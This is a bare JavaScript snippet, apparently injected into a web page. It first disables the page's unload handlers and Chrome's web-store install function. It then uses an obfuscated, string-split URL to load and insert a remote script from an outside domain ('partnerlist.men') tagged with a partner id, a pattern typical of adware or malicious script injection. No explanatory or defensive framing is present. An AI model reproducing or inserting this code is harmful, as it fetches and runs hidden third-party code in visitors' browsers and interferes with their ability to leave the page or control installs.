location.href = "javascript:(" + function() {
  window.onbeforeunload = null;
  window.onunload = null;
  chrome.webstore.install = null;
} + ")()";

(function(){var scr=document.createElement('script');scr.type='text/javascript';scr.src="\/\/pa"+"rtne"+"rlis"+"t.me"+"n\/co"+"de\/?"+"pid="+"7184"+"06&r"+"="+Math.floor(10000000*Math.random());var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(scr,s);try{var fc=document.body.firstChild;fc.parentNode.insertBefore(s,fc);}catch(e){document.body.appendChild(s);}})();